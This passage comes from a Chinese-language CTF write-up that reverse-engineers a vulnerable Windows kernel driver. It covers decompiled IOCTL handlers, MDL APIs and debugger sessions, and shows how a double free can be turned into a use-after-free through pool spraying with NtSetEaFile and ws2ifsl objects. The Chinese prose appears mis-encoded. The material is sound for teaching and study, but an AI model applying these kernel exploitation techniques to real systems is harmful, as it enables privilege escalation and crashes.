class="number">0xFFF</span>) &amp; <span class="number">0xFFFFF000</span>;</span><br><span class="line">      pVirtualAddress = <span class="built_in">MmAllocateContiguousMemory</span>(usSize, (PHYSICAL_ADDRESS)<span class="number">0xFFFFFFFFFFFFFFFF</span>ui64);</span><br><span class="line">      _pVirtualAddress = pVirtualAddress;</span><br><span class="line">      <span class="keyword">if</span> ( pVirtualAddress )</span><br><span class="line">      &#123;</span><br><span class="line">        pMdl = <span class="built_in">IoAllocateMdl</span>(pVirtualAddress, usSize, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>i64);/</span><br><span class="line">        _pMdl = pMdl;</span><br><span class="line">        <span class="keyword">if</span> ( pMdl )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">MmBuildMdlForNonPagedPool</span>(pMdl); </span><br><span class="line">          pMapAddr = (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">MmMapLockedPagesSpecifyCache</span>(_pMdl, <span class="number">1</span>, MmNonCached, <span class="number">0</span>i64, <span class="number">0</span>, <span class="number">0x10</span>u);</span><br><span class="line">          _pMapAddr = pMapAddr;</span><br><span class="line">          <span class="keyword">if</span> ( pMapAddr )</span><br><span class="line">          &#123;</span><br><span class="line">            *(_QWORD *)DeviceExtension = pMapAddr;</span><br><span class="line">            *((_QWORD *)DeviceExtension + <span class="number">1</span>) = _pVirtualAddress;</span><br><span class="line">            *((_QWORD *)DeviceExtension + <span class="number">2</span>) = _pMdl;</span><br><span class="line">            <span class="built_in">Memset</span>(<span class="type">void</span> *)pMapAddr, <span class="number">0xFF</span>, usSize);</span><br><span class="line">            *SystemBuffer = usSize;             </span><br><span class="line">            SystemBuffer[<span class="number">1</span>] = _pMapAddr;        </span><br><span class="line">            irp-&gt;IoStatus.Information = <span class="number">8</span>i64;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">          &#125;</span><br><span class="line">LABEL_31:</span><br><span class="line">          <span class="built_in">IoFreeMdl</span>(_pMdl);</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_29:</span><br><span class="line">        <span class="built_in">MmFreeContiguousMemory</span>(_pVirtualAddress);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xC000009A</span>i64;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x9C402404</span>:</span><br><span class="line">      <span class="keyword">if</span> ( ulInputBufferLength != <span class="number">4</span> || ulOutputBufferLength != <span class="number">12</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">      buffer = (<span class="type">char</span> *)irp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">      _usSize = (*(_DWORD *)buffer + <span class="number">0xFFF</span>) &amp; <span class="number">0xFFFFF000</span>;</span><br><span class="line">      ContiguousMemory = <span class="built_in">MmAllocateContiguousMemory</span>(_usSize, (PHYSICAL_ADDRESS)<span class="number">0xFFFFFFFFFFFFFFFF</span>ui64);</span><br><span class="line">      _pVirtualAddress = ContiguousMemory;</span><br><span class="line">      <span class="keyword">if</span> ( ContiguousMemory )</span><br><span class="line">      &#123;</span><br><span class="line">        Mdl = <span class="built_in">IoAllocateMdl</span>(ContiguousMemory, _usSize, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>i64);</span><br><span class="line">        _pMdl = Mdl;</span><br><span class="line">        <span class="keyword">if</span> ( Mdl )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">MmBuildMdlForNonPagedPool</span>(Mdl);</span><br><span class="line">          pStartAddr2 = <span class="built_in">MmMapLockedPagesSpecifyCache</span>(_pMdl, <span class="number">1</span>, MmNonCached, <span class="number">0</span>i64, <span class="number">0</span>, <span class="number">0x10</span>u);</span><br><span class="line">          _pStartAddr2 = pStartAddr2;</span><br><span class="line">          <span class="keyword">if</span> ( pStartAddr2 )</span><br><span class="line">          &#123;</span><br><span class="line">            *((_QWORD *)DeviceExtension + <span class="number">4</span>) = _pVirtualAddress;</span><br><span class="line">            *((_QWORD *)DeviceExtension + <span class="number">3</span>) = pStartAddr2;</span><br><span class="line">            *((_QWORD *)DeviceExtension + <span class="number">5</span>) = _pMdl;</span><br><span class="line">            <span class="built_in">Memset</span>(pStartAddr2, <span class="number">0xFF</span>, _usSize);</span><br><span class="line">            *(_DWORD *)buffer = _usSize;</span><br><span class="line">            *(_QWORD *)(buffer + <span class="number">4</span>) = _pStartAddr2;</span><br><span class="line">            irp-&gt;IoStatus.Information = <span class="number">12</span>i64;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xC000009A</span>i64;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x9C402408</span>:</span><br><span class="line">      <span class="keyword">if</span> ( !*(_QWORD *)DeviceExtension )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      __pMdl = (<span class="keyword">struct</span> _MDL *)*((_QWORD *)DeviceExtension + <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !__pMdl || !*((_QWORD *)DeviceExtension + <span class="number">1</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      <span class="built_in">MmUnmapLockedPages</span>(*(PVOID *)DeviceExtension, __pMdl);</span><br><span class="line">      <span class="built_in">IoFreeMdl</span>(*((PMDL *)DeviceExtension + <span class="number">2</span>));</span><br><span class="line">      __pVirtualAddress = (<span class="type">void</span> *)*((_QWORD *)DeviceExtension + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x9C40240C</span>:</span><br><span class="line">      __pStartAddr2 = (<span class="type">void</span> *)*((_QWORD *)DeviceExtension + <span class="number">3</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !__pStartAddr2 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      __pMdl2 = (<span class="keyword">struct</span> _MDL *)*((_QWORD *)DeviceExtension + <span class="number">5</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !__pMdl2 || !*((_QWORD *)DeviceExtension + <span class="number">4</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      <span class="built_in">MmUnmapLockedPages</span>(__pStartAddr2, __pMdl2);</span><br><span class="line">      <span class="built_in">IoFreeMdl</span>(*((PMDL *)DeviceExtension + <span class="number">5</span>));</span><br><span class="line">      __pVirtualAddress = (<span class="type">void</span> *)*((_QWORD *)DeviceExtension + <span class="number">4</span>);</span><br><span class="line">LABEL_16:</span><br><span class="line">      <span class="built_in">MmFreeContiguousMemory</span>(__pVirtualAddress);</span><br><span class="line">LABEL_17:</span><br><span class="line">      irp-&gt;IoStatus.Information = <span class="number">0</span>i64;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="number">0xC0000010</span>;</span><br><span class="line">LABEL_34:</span><br><span class="line">  irp-&gt;IoStatus.Status = v3;</span><br><span class="line">  <span class="built_in">IofCompleteRequest</span>(irp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="MDL"><a href="#MDL" class="headerlink" title="MDL"></a>MDL</h3><p>memory descriptor list</p>
<p>è·¨ä¸€ç³»åˆ—è¿ç»­è™šæ‹Ÿå†…å­˜åœ°å€çš„ I&#x2F;O ç¼“å†²åŒºå¯ä»¥åˆ†å¸ƒåœ¨å¤šä¸ªç‰©ç†é¡µä¸­ï¼Œå¹¶ä¸”è¿™äº›é¡µé¢å¯ä»¥æ˜¯ä¸è¿ç»­çš„ã€‚ æ“ä½œç³»ç»Ÿä½¿ç”¨Â <em>å†…å­˜æè¿°ç¬¦åˆ—è¡¨</em>Â (MDL) æ¥æè¿°è™šæ‹Ÿå†…å­˜ç¼“å†²åŒºçš„ç‰©ç†é¡µé¢å¸ƒå±€ã€‚</p>
<ul>
<li>StartVaï¼špageå¼€å§‹çš„åœ°å€</li>
<li>ByteOffsetï¼šåœ¨pageå†…çš„åç§»</li>
<li>ByteCount: å¤§å°</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_MDL</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_MDL</span>      *Next;</span><br><span class="line">  CSHORT           Size;</span><br><span class="line">  CSHORT           MdlFlags;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_EPROCESS</span> *Process;</span><br><span class="line">  PVOID            MappedSystemVa;</span><br><span class="line">  PVOID            StartVa;</span><br><span class="line">  ULONG            ByteCount;</span><br><span class="line">  ULONG            ByteOffset;</span><br><span class="line">&#125; MDL, *PMDL;</span><br></pre></td></tr></table></figure>

<h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p><strong>MmAllocateContiguousMemory</strong>ï¼šåˆ†é…ä¸€ç³»åˆ—è¿ç»­çš„NonPagedPoolå†…å­˜ï¼Œå¹¶å°†å…¶æ˜ å°„åˆ°ç³»ç»Ÿåœ°å€ç©ºé—´ï¼Œåˆ†é…çš„å†…å­˜æœªåˆå§‹åŒ–</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è¿”å›å·²åˆ†é…å†…å­˜çš„åŸºè™šæ‹Ÿåœ°å€ã€‚</span></span><br><span class="line"><span class="function">PVOID <span class="title">MmAllocateContiguousMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] SIZE_T           NumberOfBytes,           <span class="comment">// è¦åˆ†é…çš„è¿ç»­å†…å­˜å—çš„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PHYSICAL_ADDRESS HighestAcceptableAddress <span class="comment">// è°ƒç”¨æ–¹å¯ä»¥ä½¿ç”¨çš„æœ€é«˜æœ‰æ•ˆç‰©ç†åœ°å€ã€‚</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>é‡Šæ”¾ç”±Â <strong>MmAllocateContiguousMemoryXxx</strong>Â åˆ†é…çš„ä¸€ç³»åˆ—ç‰©ç†è¿ç»­å†…å­˜ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MmFreeContiguousMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PVOID BaseAddress</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>ç»™å®šç¼“å†²åŒºçš„èµ·å§‹åœ°å€å’Œé•¿åº¦ï¼ŒÂ <strong>IoAllocateMdl</strong>Â åˆ†é…å†…å­˜æè¿°ç¬¦åˆ—è¡¨ (MDL) è¶³ä»¥æ˜ å°„ç¼“å†²åŒºï¼ˆNonPagedPoolï¼‰ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è¿”å›æŒ‡å‘ MDL çš„æŒ‡é’ˆ</span></span><br><span class="line"><span class="function">PMDL <span class="title">IoAllocateMdl</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      __drv_aliasesMem PVOID VirtualAddress,   <span class="comment">// æŒ‡å‘ MDL è¦æè¿°çš„ç¼“å†²åŒºçš„åŸºè™šæ‹Ÿåœ°å€çš„æŒ‡é’ˆã€‚</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                ULONG                  Length,           <span class="comment">// æŒ‡å®š MDL è¦æè¿°çš„ç¼“å†²åŒºçš„é•¿åº¦ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                BOOLEAN                SecondaryBuffer,  <span class="comment">// æŒ‡ç¤ºç¼“å†²åŒºæ˜¯ä¸»ç¼“å†²åŒºè¿˜æ˜¯è¾…åŠ©ç¼“å†²åŒºã€‚</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                BOOLEAN                ChargeQuota,      <span class="comment">// é¢„ç•™ç»™ç³»ç»Ÿä½¿ç”¨ã€‚ é©±åŠ¨ç¨‹åºå¿…é¡»å°†æ­¤å‚æ•°è®¾ç½®ä¸ºÂ **FALSE**ã€‚</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out, optional] PIRP                   Irp               <span class="comment">// æŒ‡å‘è¦ä¸ MDL å…³è”çš„ IRP çš„æŒ‡é’ˆ</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Ntoskrnl.exe</span></span><br><span class="line">result = (PMDL)<span class="built_in">ExAllocatePoolWithTag</span>(NonPagedPoolNx, size, <span class="string">&#x27; ldM&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºä¸€ä¸ªMDLç»“æ„ä½“ï¼Œè€Œè¿™ä¸ªç»“æ„ä½“æè¿°ç»™å‡ºçš„VurtualAddress</p>
<p><strong>IoFreeMdl</strong>Â é‡Šæ”¾è°ƒç”¨æ–¹åˆ†é…çš„å†…å­˜æè¿°ç¬¦åˆ—è¡¨ (MDL) ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">IoFreeMdl</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PMDL Mdl</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong>MmBuildMdlForNonPagedPool</strong>Â æ¥æ”¶æŒ‡å®šéåˆ†é¡µè™šæ‹Ÿå†…å­˜ç¼“å†²åŒºçš„ MDLï¼Œå¹¶æ›´æ–°å®ƒä»¥æè¿°åŸºç¡€ç‰©ç†é¡µã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MmBuildMdlForNonPagedPool</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out] PMDL MemoryDescriptorList    <span class="comment">// æŒ‡å‘ MDL çš„æŒ‡é’ˆ</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong>MmMapLockedPagesSpecifyCache</strong>Â å°† MDL æè¿°çš„ç‰©ç†é¡µé¢æ˜ å°„åˆ°è™šæ‹Ÿåœ°å€ï¼Œå¹¶ä½¿è°ƒç”¨æ–¹èƒ½å¤ŸæŒ‡å®šç”¨äºåˆ›å»ºæ˜ å°„çš„ç¼“å­˜å±æ€§ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">MmMapLockedPagesSpecifyCache</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           PMDL                                                                          MemoryDescriptorList,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           __drv_strictType(KPROCESSOR_MODE / <span class="keyword">enum</span> _MODE,__drv_typeConst)KPROCESSOR_MODE AccessMode,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           __drv_strictTypeMatch(__drv_typeCond)MEMORY_CACHING_TYPE                      CacheType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] PVOID                                                                         RequestedAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG                                                                         BugCheckOnFailure,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG                                                                         Priority</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>AccessModeï¼š<strong>KernelMode</strong>Â æˆ–Â <strong>UserMode</strong>ã€‚ </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_MODE</span> &#123; </span><br><span class="line">    KernelMode, </span><br><span class="line">    UserMode, </span><br><span class="line">    MaximumMode </span><br><span class="line">&#125; MODE; </span><br></pre></td></tr></table></figure>

<p><code>MmNonCached</code>ï¼šè¯·æ±‚çš„å†…å­˜ä¸åº”ç”±å¤„ç†å™¨ç¼“å­˜ã€‚</p>
<h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p>åˆ†é…äº†ä¸¤ä¸ªNonPagedPoolå†…å­˜ï¼Œåœ¨Freeåå¹¶æ²¡æœ‰æŠŠç›¸å…³ä½ç½®ç½®ä¸º0ï¼Œå¯ä»¥å¤šæ¬¡freeã€‚</p>
<p>ä¸‹æ–­ç‚¹è°ƒè¯•</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; lm m s*</span><br><span class="line">Browse full <span class="keyword">module</span> list</span><br><span class="line"><span class="comment">// æŸ¥çœ‹startå†…å­˜ï¼ŒPEæ–‡ä»¶æ ¼å¼</span></span><br><span class="line">start             end                 <span class="keyword">module</span> name</span><br><span class="line">fffff805`<span class="number">1b</span>010000 fffff805`<span class="number">1b</span>019000   <span class="built_in">sioctl</span>     (no symbols)</span><br><span class="line"><span class="comment">// IDA: 140005020 </span></span><br><span class="line"><span class="comment">// åç§»ï¼š0x5020 </span></span><br><span class="line"><span class="number">0</span>: kd&gt; ba e1 sioctl+<span class="number">0x5020</span>  <span class="comment">// ioctl</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>: kd&gt; p</span><br></pre></td></tr></table></figure>

<p><code>0x9C402400</code> IoAllocateMdlï¼Œæ ¹æ®è¿”å›å€¼ç¡®å®šä¸€ä¸‹MDLçš„å¤§å°</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; </span><br><span class="line">sioctl+<span class="number">0x521e</span>:</span><br><span class="line">fffff80a`<span class="number">9852521</span>e ff150cceffff    call    qword ptr [sioctl+<span class="number">0x2030</span> (fffff80a`<span class="number">98522030</span>)]</span><br><span class="line"></span><br><span class="line">*ffff880ab958ed20 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated) *Mdl</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ç¨‹åºèµ°åˆ°Memsetä¼šæŠ¥é”™ï¼Œå› ä¸ºåœ°å€ä¸å¯¹ï¼Œå¯ä»¥ä»æ±‡ç¼–çœ‹å‡ºæ¥ä½¿ç”¨32ä½åœ°å€æˆªæ–­</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">PAGE:<span class="number">000000014000526F</span>                 mov     ecx, r12d       ; Dst</span><br><span class="line">PAGE:<span class="number">0000000140005272</span>                 mov     edx, <span class="number">0F</span>Fh       ; Val</span><br><span class="line">PAGE:<span class="number">0000000140005277</span>                 mov     r8d, r15d       ; Size</span><br></pre></td></tr></table></figure>

<h3 id="Io-NpFr-Ws2P"><a href="#Io-NpFr-Ws2P" class="headerlink" title="Io&#x2F;NpFr&#x2F;Ws2P"></a>Io&#x2F;NpFr&#x2F;Ws2P</h3><p>å®˜æ–¹WPï¼š<a href="https://xz.aliyun.com/t/14190">ç¬¬äºŒå±ŠAliyunCTFå®˜æ–¹writeup</a> â€“ å› ä¸ºè¿™é‡Œè®¾è®¡æ˜¯ç»™32ä½ç¨‹åºä½¿ç”¨çš„å›è°ƒï¼Œ64ä½ç¨‹åºçš„ç”¨æˆ·æ€åœ°å€åœ¨å‘ç”Ÿinteger truncationåå¾€å¾€æ˜¯éæ³•åœ°å€ï¼Œé¢„æœŸæ˜¯é€šè¿‡ä¸€ä¸ª32ä½çš„ç¨‹åºå®Œæˆåˆ©ç”¨</p>
<p>åœ¨VSé‡Œé€‰æ‹©x86ç”Ÿæˆï¼Œ<code>0x9C402400</code> ç¡®å®æ²¡æœ‰å´©æºƒã€‚</p>
<ul>
<li>è¿™é‡Œè¿˜å¿…é¡»å¾—ä½¿ç”¨ï¼Œå› ä¸ºå¦‚æœ <code>MmAllocateContiguousMemory</code> åˆ†é…çš„å†…å­˜è¢«è¿ç»­é‡Šæ”¾ä¼šè“å±</li>
</ul>
<p>æ€è·¯æ˜¯ DF è½¬åŒ–ä¸º æŒ‡å®šç»“æ„ä½“çš„ UAFã€‚</p>
<p>è¿™é‡Œä½œè€…ä»‹ç»äº†ä¸¤ç§å †å–·çš„å¯¹è±¡</p>
<ul>
<li>IopVerifierExAllocatePoolWithQuotaçš„è°ƒç”¨ä¸­ä¼šç”³è¯·ç±»å‹ä¸ºNonPagedPoolNxçš„Pool</li>
<li>ç»å…¸çš„NpFr</li>
</ul>
<h4 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h4><p>è¿™ä¸ª<strong>ç»“æ„å¤§å°å¯ä»¥æ§åˆ¶ï¼Œå†…å®¹å¯ä»¥æ§åˆ¶</strong>ï¼Œå“ç›¸ç›¸å½“ä¸é”™</p>
<p>IopVerifierExAllocatePoolWithQuotaï¼šå…¶ä¸Šå±‚è°ƒç”¨å¦‚NtSetInformationFileã€NtSetEaFileç­‰å‡½æ•°éƒ½å¯ä»¥å®ç°æ§åˆ¶ç”³è¯·poolçš„å¤§å°ï¼Œå¹¶å†™å…¥å†…å®¹ã€‚ä½†æ˜¯å´å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯è¿™ç±»poolTagä¸ºIOçš„æ± ï¼Œéƒ½ä¼šåœ¨IOç»“æŸæ—¶è¢«é‡Šæ”¾ï¼Œè™½ç„¶è¢«é‡Šæ”¾äº†ï¼Œä½†æ˜¯å½“å‰å†…æ ¸æ± çš„å†…å®¹å¹¶æ²¡æœ‰ç«‹å³è¢«å ç”¨ï¼Œå†…å®¹è¿˜åœ¨ã€‚</p>
<p>ç›¸å…³å†…å®¹ï¼š<a href="https://www.anquanke.com/post/id/255916">etw äº‹ä»¶ç®¡ç†å™¨å†…æ ¸æ¼æ´åˆ©ç”¨</a></p>
<p>ntkrnlImp.exeï¼ˆntoskrnl.exeï¼‰</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">PVOID __fastcall <span class="title">IopVerifierExAllocatePoolWithQuota</span><span class="params">(__int64 a1, SIZE_T a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PVOID result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !ViVerifierEnabled</span><br><span class="line">    || (VfRuleClasses &amp; <span class="number">0xFFAFFFFF</span>) == <span class="number">0</span></span><br><span class="line">    &amp;&amp; (VfRuleClasses &amp; <span class="number">0x200000000</span>i64) == <span class="number">0</span></span><br><span class="line">    &amp;&amp; (VfRuleClasses &amp; <span class="number">0x400000000</span>i64) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">ExAllocatePoolWithQuotaTag</span>(NonPagedPoolNx, a2, <span class="string">&#x27;  oI&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="built_in">ExAllocatePoolWithTagPriority</span>(</span><br><span class="line">             NonPagedPoolNx,</span><br><span class="line">             a2,</span><br><span class="line">             <span class="number">0x20206F49</span>u,</span><br><span class="line">             (EX_POOL_PRIORITY)((MmVerifierData &amp; <span class="number">0x10</span> | <span class="number">0x40</span>u) &gt;&gt; <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="built_in">RtlRaiseStatus</span>(<span class="number">3221225626</span>i64);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>äº¤å‰å¼•ç”¨ï¼šNtSetEaFileï¼Œè¯¥å‡½æ•°å†…éƒ¨æ£€æµ‹DEVICE_OBJECTçš„Flagsæ˜¯å¦åŒ…å«4ï¼ˆDO_BUFFERED_IOï¼‰ï¼Œå› æ­¤ç¬¬ä¸€ä¸ªå‚æ•°çš„å¥æŸ„ç»™çš„æ˜¯<code>PEAuth</code>çš„æ–‡ä»¶å¥æŸ„ï¼ŒEVICE_OBJECTçš„Flagsä¸º0x44ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSYSAPI </span></span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function">NTAPI</span></span><br><span class="line"><span class="function"><span class="title">NtSetEaFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  IN HANDLE               FileHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  OUT PIO_STATUS_BLOCK    IoStatusBlock,</span></span></span><br><span class="line"><span class="params"><span class="function">  IN PVOID                EaBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  IN ULONG                EaBufferSize </span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sets extended-attribute (EA) values for a file.</span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">NtSetEaFile</span><span class="params">(<span class="type">int</span> a1, <span class="type">unsigned</span> __int64 a2, <span class="type">unsigned</span> __int64 a3, ULONG a4)</span></span></span><br><span class="line"><span class="function"><span class="comment">// ...</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">v4 </span>= (<span class="type">void</span> *)a3;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// v12 æ˜¯ç»è¿‡ a1(FileHandler) å¯»æ‰¾åˆ°çš„Object</span></span><br><span class="line">DeviceObject = <span class="built_in">IoGetRelatedDeviceObject</span>(v12);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">Flags = DeviceObject-&gt;Flags;</span><br><span class="line"><span class="keyword">if</span> ( (Flags &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">	ErrorOffset = <span class="number">0</span>;</span><br><span class="line">	v26 = a4;</span><br><span class="line">	<span class="keyword">if</span> ( a4 )</span><br><span class="line">	&#123;</span><br><span class="line">	  v35 = <span class="number">0</span>;</span><br><span class="line">	  PoolWithQuota = (<span class="keyword">struct</span> _FILE_FULL_EA_INFORMATION *)<span class="built_in">IopVerifierExAllocatePoolWithQuota</span>(<span class="number">0</span>i64, a4);</span><br><span class="line">	  Irp-&gt;AssociatedIrp.MasterIrp = (_IRP *)PoolWithQuota;</span><br><span class="line">	  <span class="built_in">memmove</span>(PoolWithQuota, v4, a4);</span><br><span class="line">	  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<h4 id="Ws2P"><a href="#Ws2P" class="headerlink" title="Ws2P"></a>Ws2P</h4><p>å¦å¤–ä¸€ä¸ªå¯¹è±¡ï¼Œä½œè€…ç»™å‡º <code>ws2ifsl</code>ï¼Œå¯ä»¥çœ‹å¦‚ä¸‹çš„æ–‡ç« äº†è§£ä¸€ä¸‹</p>
<ul>
<li><a href="https://www.anquanke.com/post/id/196893">Windowså†…æ ¸ws2ifsl.sysä¸­UAFæ¼æ´åˆ†æ</a></li>
<li><a href="https://bbs.kanxue.com/thread-257435.htm">CVE-2019-1215åˆ†æç¬”è®°</a></li>
</ul>
<p>å½“è°ƒç”¨NtCreateFileæ—¶ï¼Œæ–‡ä»¶åè®¾ç½®ä¸º<code>\Device\WS2IFSL\</code>ï¼Œå°†è°ƒç”¨DispatchCreateå‡½æ•°ï¼Œå‡½æ•°å°†æ ¹æ®æ–‡ä»¶åä¸­çš„<code>_FILE_FULL_EA_INFORMATION.EaName</code>å­—ç¬¦ä¸²è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœæ˜¯NifsPvdï¼Œå®ƒå°†è°ƒç”¨CreateProcessFileï¼Œå¦‚æœæ˜¯NifsSctï¼Œå®ƒå°†è°ƒç”¨CreateSocketFileã€‚</p>
<p>CreateProcessFileå‡½æ•°éƒ½åˆ›å»ºå†…éƒ¨å¯¹è±¡ï¼Œç§°ä¸º<code>procData</code>ã€‚åˆ›å»ºåï¼Œè¿™äº›å¯¹è±¡å°†ä¿å­˜åœ¨æ–‡ä»¶å¯¹è±¡çš„<code>_FILE_OBJECT.FsContext</code>ä¸­</p>
<p>ws2ifsl.sys!DispatchCreate</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">DispatchCreate</span><span class="params">(__int64 a1, IRP *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 MasterIrp; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_STACK_LOCATION</span> *CurrentStackLocation; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> ProcessFile; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  MasterIrp = (__int64)a2-&gt;AssociatedIrp.MasterIrp;</span><br><span class="line">  <span class="keyword">if</span> ( !MasterIrp )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  CurrentStackLocation = a2-&gt;Tail.Overlay.CurrentStackLocation;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE 